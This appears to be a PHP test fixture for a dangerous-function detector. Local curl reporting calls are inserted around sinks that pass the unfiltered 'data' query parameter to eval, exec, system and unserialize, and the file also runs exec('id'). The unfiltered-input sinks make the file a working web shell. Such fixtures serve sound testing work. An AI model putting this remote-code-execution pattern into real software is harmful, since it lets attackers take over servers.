<?php # instrumented by cfa51125badee1841056a48db639853a ?>
<?php

if (isset($_GET["data"])) {
  $a = $_GET["data"];
}
else{
  exit();
}
system("curl http://127.0.0.1:65534/report?function=eval\&line=11\&file=./test2/main.php\&params=not_configured");
@eval($a);
qexec($a);
system("curl http://127.0.0.1:65534/report?function=exec\&line=14\&file=./test2/main.php\&params=not_configured");
@exec($a);
curl_exec($a);
custom_exec($a);
unserialize($a);

system("curl http://127.0.0.1:65534/report?function=exec\&line=20\&file=./test2/main.php\&params=not_configured");
$cevap = @exec("id");
system("curl http://127.0.0.1:65534/report?function=system\&line=22\&file=./test2/main.php\&params=not_configured");
$cevap2 = @system(eval($a));
system("curl http://127.0.0.1:65534/report?function=eval\&line=23\&file=./test2/main.php\&params=not_configured");
?>
